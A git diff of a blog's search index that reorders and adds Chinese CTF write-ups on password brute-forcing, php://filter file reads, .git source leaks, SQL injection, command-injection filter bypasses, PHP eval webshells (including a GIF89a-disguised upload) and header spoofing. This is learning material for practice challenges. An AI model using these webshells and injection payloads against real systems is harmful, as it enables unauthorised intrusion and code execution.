@@ -1606,6 +1606,26 @@
       </tags>
   </entry>
   <entry>
+    <title>bugku-bp</title>
+    <url>/2021/12/05/bugku-bp/</url>
+    <content><![CDATA[<p>根据题目提示，要用top1000密码</p>
+<p><img src="/2021/12/05/bugku-bp/image-20211205185551656.png" alt="image-20211205185551656"></p>
+<p>爆破结果如下</p>
+<span id="more"></span>
+
+<p><img src="/2021/12/05/bugku-bp/image-20211205185641750.png" alt="image-20211205185641750"></p>
+<p>结果均为908，则猜想正确结果与错误结果的length一样，则选择其他参考标准，通过观察响应包里面的内容，我们发现错误包里面都会返回一个JavaScript代码告知我们的密码有错误。因此我们通过Burpsuite的 （Grep – Match 在响应中找出存在指定的内容的一项。）过滤掉存在JavaScript代码中的{code: ‘bugku10000’}的数据包。</p>
+<p>添加如图内容，继续爆破</p>
+<p><img src="/2021/12/05/bugku-bp/image-20211205185817178.png" alt="image-20211205185817178"></p>
+<p>发现可疑点</p>
+<p><img src="/2021/12/05/bugku-bp/image-20211205185906383.png" alt="image-20211205185906383"></p>
+<p>输入该密码，得到flag。</p>
+]]></content>
+      <tags>
+        <tag>bp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Git的介绍、安装和基本提交</title>
     <url>/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/</url>
     <content><![CDATA[<h1 id="Git的优势"><a href="#Git的优势" class="headerlink" title="Git的优势"></a>Git的优势</h1><ul>
@@ -1696,81 +1716,6 @@
 <p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225112194.png" alt="image-20220108225112194"></p>
 <p>然后进行提交，这里用<code>git commit -m &quot;备注&quot; test.txt</code>进行提交，不用再在vim编辑器里输入备注信息</p>
 <p><img src="/2022/01/08/git%E4%BB%8B%E7%BB%8D%E5%AE%89%E8%A3%85%E5%92%8C%E6%8F%90%E4%BA%A4/image-20220108225410302.png" alt="image-20220108225410302"></p>
-]]></content>
-      <tags>
-        <tag>Git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bugku-bp</title>
-    <url>/2021/12/05/bugku-bp/</url>
-    <content><![CDATA[<p>根据题目提示，要用top1000密码</p>
-<p><img src="/2021/12/05/bugku-bp/image-20211205185551656.png" alt="image-20211205185551656"></p>
-<p>爆破结果如下</p>
-<span id="more"></span>
-
-<p><img src="/2021/12/05/bugku-bp/image-20211205185641750.png" alt="image-20211205185641750"></p>
-<p>结果均为908，则猜想正确结果与错误结果的length一样，则选择其他参考标准，通过观察响应包里面的内容，我们发现错误包里面都会返回一个JavaScript代码告知我们的密码有错误。因此我们通过Burpsuite的 （Grep – Match 在响应中找出存在指定的内容的一项。）过滤掉存在JavaScript代码中的{code: ‘bugku10000’}的数据包。</p>
-<p>添加如图内容，继续爆破</p>
-<p><img src="/2021/12/05/bugku-bp/image-20211205185817178.png" alt="image-20211205185817178"></p>
-<p>发现可疑点</p>
-<p><img src="/2021/12/05/bugku-bp/image-20211205185906383.png" alt="image-20211205185906383"></p>
-<p>输入该密码，得到flag。</p>
-]]></content>
-      <tags>
-        <tag>bp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php://filter 协议</title>
-    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
-<p><strong>1</strong>是格式<br><strong>2</strong>是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br><strong>3</strong>是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br><strong>4</strong>是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
-<span id="more"></span>
-
-<p>转base64编码：<code>convert.base64-encode</code></p>
-<p>转大写：<code>string.toupper</code></p>
-<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
-<p>例题：</p>
-<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
-<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
-<p>构造：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
-<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
-<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
-]]></content>
-      <tags>
-        <tag>php协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>scrabble的使用</title>
-    <url>/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="scrabble介绍"><a href="#scrabble介绍" class="headerlink" title="scrabble介绍"></a>scrabble介绍</h1><p>scrabble适用常规的git泄露，用于获取源码。开发人员忘记.git文件，导致攻击者可以通过.git文件夹中的信息获取开发人员所提交过的源码。</p>
-<p>安装：<code>git clone https://github.com/denny0223/scrabble</code>(用在linux系统中)</p>
-<span id="more"></span>
-
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143040320.png" alt="image-20220128143040320"></p>
-<p>有时候获取不到，多试几次，毕竟github有时候进不去，呜呜呜。</p>
-<h1 id="测试环境的搭建"><a href="#测试环境的搭建" class="headerlink" title="测试环境的搭建"></a>测试环境的搭建</h1><p>这里用Ubuntu和PHPstudy示范</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143248746.png" alt="image-20220128143248746"></p>
-<p>进入根目录后，创建test测试文件</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143340203.png" alt="image-20220128143340203"></p>
-<p>若出现如下情况，直接用命令行进入管理员模式访问吧。</p>
-<p>进入管理员模式：<code>su root</code>，然后输入密码即可，注意，密码输入后是不会显示的。</p>
-<p>然后切换到目的文件夹</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143610379.png" alt="image-20220128143610379"></p>
-<p>这里我已经创建了几个文档和一个文件夹，文档的创建过程见Git教程，文件夹的创建<code>mkdir 文件夹名</code></p>
-<p>所以，这里我们的测试网址应该是<code>http://127.0.0.1/test</code>。</p>
-<p>顺便补充一下，我这里还搭建了sqli-labs靶场，虚拟机内访问是<code>http://127.0.0.1/sqli-labs</code>，物理机访问是要把127.0.0.1换成虚拟机的IP v4地址。查看方法如下</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144009957.png" alt="image-20220128144009957"></p>
-<h1 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h1><p>按照图中的指令即可</p>
-<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144150492.png" alt="image-20220128144150492"></p>
-<p>注意，这里用完后，原来scrabble文件夹中的内容就被目标网站中的源码取代了，所以建议备份scrabble源文件，要不还得git clone一下。获取后直接cat查看就可以了。但是我试了一下，这里并不能获得sqli-labs的源文件，目测是因为sqli-labs中.git文件夹中的信息不太友好，本地对其并没有操作。所以也就没有git提交记录。</p>
-<p><strong>还有一种情况是，flag会藏在老版本里，所以我们用scrabble获取源码后。输入<code>git log</code>查看以前版本，并切换，从而找到flag</strong></p>
-<p>再补充一下，<code>git reflog</code>版本信息更全，能够看更先进的版本（如果有的话）。而<code>git log</code>只能看老版本</p>
 ]]></content>
       <tags>
         <tag>Git</tag>
@@ -1877,6 +1822,61 @@
 ]]></content>
       <tags>
         <tag>杂谈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php://filter 协议</title>
+    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
+<p><strong>1</strong>是格式<br><strong>2</strong>是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br><strong>3</strong>是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br><strong>4</strong>是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
+<span id="more"></span>
+
+<p>转base64编码：<code>convert.base64-encode</code></p>
+<p>转大写：<code>string.toupper</code></p>
+<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
+<p>例题：</p>
+<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
+<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
+<p>构造：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
+<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
+<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
+]]></content>
+      <tags>
+        <tag>php协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>scrabble的使用</title>
+    <url>/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="scrabble介绍"><a href="#scrabble介绍" class="headerlink" title="scrabble介绍"></a>scrabble介绍</h1><p>scrabble适用常规的git泄露，用于获取源码。开发人员忘记.git文件，导致攻击者可以通过.git文件夹中的信息获取开发人员所提交过的源码。</p>
+<p>安装：<code>git clone https://github.com/denny0223/scrabble</code>(用在linux系统中)</p>
+<span id="more"></span>
+
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143040320.png" alt="image-20220128143040320"></p>
+<p>有时候获取不到，多试几次，毕竟github有时候进不去，呜呜呜。</p>
+<h1 id="测试环境的搭建"><a href="#测试环境的搭建" class="headerlink" title="测试环境的搭建"></a>测试环境的搭建</h1><p>这里用Ubuntu和PHPstudy示范</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143248746.png" alt="image-20220128143248746"></p>
+<p>进入根目录后，创建test测试文件</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143340203.png" alt="image-20220128143340203"></p>
+<p>若出现如下情况，直接用命令行进入管理员模式访问吧。</p>
+<p>进入管理员模式：<code>su root</code>，然后输入密码即可，注意，密码输入后是不会显示的。</p>
+<p>然后切换到目的文件夹</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128143610379.png" alt="image-20220128143610379"></p>
+<p>这里我已经创建了几个文档和一个文件夹，文档的创建过程见Git教程，文件夹的创建<code>mkdir 文件夹名</code></p>
+<p>所以，这里我们的测试网址应该是<code>http://127.0.0.1/test</code>。</p>
+<p>顺便补充一下，我这里还搭建了sqli-labs靶场，虚拟机内访问是<code>http://127.0.0.1/sqli-labs</code>，物理机访问是要把127.0.0.1换成虚拟机的IP v4地址。查看方法如下</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144009957.png" alt="image-20220128144009957"></p>
+<h1 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h1><p>按照图中的指令即可</p>
+<p><img src="/2022/01/28/scrabble%E7%9A%84%E4%BD%BF%E7%94%A8/image-20220128144150492.png" alt="image-20220128144150492"></p>
+<p>注意，这里用完后，原来scrabble文件夹中的内容就被目标网站中的源码取代了，所以建议备份scrabble源文件，要不还得git clone一下。获取后直接cat查看就可以了。但是我试了一下，这里并不能获得sqli-labs的源文件，目测是因为sqli-labs中.git文件夹中的信息不太友好，本地对其并没有操作。所以也就没有git提交记录。</p>
+<p><strong>还有一种情况是，flag会藏在老版本里，所以我们用scrabble获取源码后。输入<code>git log</code>查看以前版本，并切换，从而找到flag</strong></p>
+<p>再补充一下，<code>git reflog</code>版本信息更全，能够看更先进的版本（如果有的话）。而<code>git log</code>只能看老版本</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
       </tags>
   </entry>
   <entry>
@@ -2274,7 +2274,100 @@
       </tags>
   </entry>
   <entry>
-    <title>刷题记录</title>
+    <title>刷题记录-2</title>
+    <url>/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/</url>
+    <content><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>尝试用万能密码，万能密码原理<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">点这</a>。</p>
+<p><code>?username=1&#39;%23 &amp;password=1</code>这里用的是<code>%23</code>而没有用<code>--+</code>，<code>--+</code>不行的原因我也不太清楚，</p>
+<p>得到一串很像md5加密的密文。但最终没有解出来。</p>
+<p>然后进行常规的联合注入，得到</p>
+<p>字段数：3</p>
+<p>库名：geek</p>
+<p>表名：geekuser，l0ve1ysq1</p>
+<p>l0ve1ysq1表下的字段名：id，username，password</p>
+<p>geekuser表下的字段名：id，username，password</p>
+<p>然后依次查看username和password，发现geekuser里面的用户名和密码就是用万能密码登录得到的，然后再查看l0ve1ysq1里面的用户名和密码，得到flag</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>之前碰到一次Exec的题目，所以我们直接上Linux命令，但是发现<code>cat flag.php</code>和<code>cd ../</code>还有上传木马的<code>echo &#39;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&#39; &gt; hack.php</code> 等指令都用不了，看来是被过滤掉了，后来才知道这是过滤了空格space。</p>
+<p><strong>过滤空格的解决办法</strong></p>
+<ol>
+<li>$IFS</li>
+<li>${IFS}</li>
+<li>$IFS$1 //$1改成$加其他数字貌似都行</li>
+<li>&lt; </li>
+<li>&lt;&gt; </li>
+<li>{cat,flag.php}  //用逗号实现了空格功能</li>
+<li>%20 </li>
+<li>%09 </li>
+</ol>
+<p>一个一个试，发现只有<code>$IFS$1</code>管用，然后构造<code>cat$IFS$1flag.php</code>,结果提示过滤了flag字符串，所以试着cat一下index.php，结果如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码我也看不太懂，WP说是过滤了很多符号。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法一：我们构造/?ip=1;a=g;cat$IFS$1fla$a.php然后在注释里面得到flag</span><br><span class="line">方法二：cat$IFS$9`ls`,这里的反引号是内联，所谓内联，就是将反引号内命令的输出作为输入执行。</span><br><span class="line">方法三：echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh这句是先输出cat flag.php的base64编码，然后再解码，然后再执行。其中的|表示将前一个命令的输出作为后一个命令的输入。</span><br></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>进入题目后检查源码发现Secret.php文件，进入后查看源码未发现任何东西，而且给出的网址进不去。根据提示</p>
+<p>**It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn&/#39;**%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E4%B8%8D%E6%98%AF%E6%9D%A5%E6%BA%90%E4%BA%8Ehttps://Sycsecret.buuoj.cn%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFReferer%E4%B8%8D%E6%98%AFhttps://Sycsecret.buuoj.cn%E3%80%82%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E4%BF%AE%E6%94%B9header%E5%A4%B4%EF%BC%8C%E6%B7%BB%E5%8A%A0[Referer](https://blog.csdn.net/shenqueying/article/details/79426884)%EF%BC%8C%E8%BF%99%E9%87%8C%E7%94%A8Bp%E4%BF%AE%E6%94%B9%E3%80%82">https://Sycsecret.buuoj.cn&#39;**意思就是不是来源于https://Sycsecret.buuoj.cn的资源，也就是Referer不是https://Sycsecret.buuoj.cn。所以我们要修改header头，添加[Referer](https://blog.csdn.net/shenqueying/article/details/79426884)，这里用Bp修改。</a></p>
+<p><code>Referer:https://Sycsecret.buuoj.cn</code></p>
+<p>Request为</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28174</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d26e27951337-0f7088736cbf9a-b7a1438-144000-17d26e27952da6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意Referer不能在Cookie下面，且不能乱空行。</strong>结果如图</p>
+<p><img src="/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220211152257573.png" alt="image-20220211152257573"></p>
+<p>所以我们继续修改浏览器标识</p>
+<p><code>User-Agent:Syclover</code></p>
+<p>全部Request为</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28174</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Syclover</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d26e27951337-0f7088736cbf9a-b7a1438-144000-17d26e27952da6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后Response提示只能在本地浏览，则继续添加<a href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html">X-Forwarded-For</a>(<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">XFF</a>)</p>
+<p><code>X-Forwarded-For:127.0.0.1</code></p>
+<p>全部Request为</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.buuoj.cn:28174</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Syclover</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line">Referer:https://Sycsecret.buuoj.cn</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=17d26e27951337-0f7088736cbf9a-b7a1438-144000-17d26e27952da6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>最终得到flag</p>
+<h1 id="command-execution（攻防世界）"><a href="#command-execution（攻防世界）" class="headerlink" title="command_execution（攻防世界）"></a>command_execution（攻防世界）</h1><p>该题比较简单，但是注意cd ../然后再ls。这里也可以用<code>find / -name &quot;flag.txt&quot;</code>命令进行搜索，这里是猜测的文件名叫flag.txt如果不知道，那只能一个文件一个文件的找。</p>
+<p>用<code>find / -name &quot;flag.txt&quot;</code>得知flag.txt在/home/flag.txt，然后用指令<code>cat /home/flag.txt</code>得到flag</p>
+<h1 id="upload1（攻防世界）"><a href="#upload1（攻防世界）" class="headerlink" title="upload1（攻防世界）"></a>upload1（攻防世界）</h1><p>题目要求上传图片，gif不行，则随便上传一个图片，然后抓包更改后缀为.php，然后将代码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a? <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_REQUEST[<span class="number">1</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>复制进去，然后根据上传的位置，用蚁剑连接即可找到flag</p>
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>首先要了解php中的<a href="https://www.w3school.com.cn/php/func_string_chr.asp">chr()函数</a>、<a href="https://www.runoob.com/php/func-directory-scandir.html">scandir()函数</a>、<a href="https://www.runoob.com/php/php-var_dump-function.html">var_dump()函数</a>、<a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">file_get_contents()函数</a></p>
+<p>在源码中发现了<code>calc.php?num=</code>则访问calc.php发现部分源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>别人的wp说这是禁用了许多字符，我现在还看不懂。呜呜呜</p>
+<p>然后构造</p>
+<p><code>? num=var_dump(scandir(chr(47)))</code></p>
+<p><strong>?和num之间有一个空格</strong></p>
+<p><strong>原因是：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</strong></p>
+<p><img src="/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220212185644770.png" alt="image-20220212185644770"></p>
+<p>我们利用chr这个函数来构造函数内的字符串参数，就不需要用单双引号，从而成功绕过正则表达式。</p>
+<p>然后构造</p>
+<p><code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
+<p>这是/f1agg，然后即可得到flag</p>
+<h1 id="CVE-2021-41773（实验室）"><a href="#CVE-2021-41773（实验室）" class="headerlink" title="CVE-2021-41773（实验室）"></a>CVE-2021-41773（实验室）</h1><p>说是一个apache2.4.49的漏洞，具体成因我也不太清楚，加cgi-bin的原因也不清楚，呜呜呜</p>
